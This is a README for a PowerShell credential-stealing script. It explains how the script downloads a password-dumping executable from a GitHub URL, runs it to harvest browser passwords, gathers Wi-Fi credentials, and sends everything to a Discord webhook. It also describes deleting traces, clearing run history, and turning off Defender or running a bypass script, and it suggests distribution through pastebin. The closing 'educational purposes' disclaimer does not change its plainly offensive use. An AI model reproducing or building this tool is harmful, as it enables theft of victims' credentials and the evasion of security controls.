# Powershell Credential Stealer
a powershell script i made that gets browser and wifi passwords and usernames basically

# SETUP

replace the "DISCORD_WEB_HOOK_HERE" with your own discord webhook

# HOW IT WORKS

first it goes to the root of your C: drive.
removes the /temp folder if already there.
makes the /temp folder and cd's into it.
invokes a web request to my github repo.
# https://github.com/inteli73/w/raw/refs/heads/main/WebBrowserPassView.exe
(check out that github repo for more info)
downloads it as "w.exe".
runs it with "./w.exe /stext pass.txt".
waits 3 seconds and uses curl to send to your discord webhook.
# CONFIGURE IT FOR YOUR OWN DISCORD WEBHOOK
# THERE IS TWO "DISCORD_WEB_HOOK_HERE" THAT YOU NEED TO REPLACE!!
uses "netsh wlan show profiles blah blah blah for network creds.
then uses your discord webhook again.
cd's out of /temp and deletes it.
removes the run menu history and exits.
all in a matter of seconds.


# ISSUES
you may need to turn off real time protection before you run, or you run the "powershell_script_defender_bypass.txt" (you will need to run as admin).
if you want to a kind of web shortcut i recommend using an unlisted pastebin file.

# PURPOSES
this is only educational and informational purposes!!!
i am not responsible for any harm that this script causes!!!
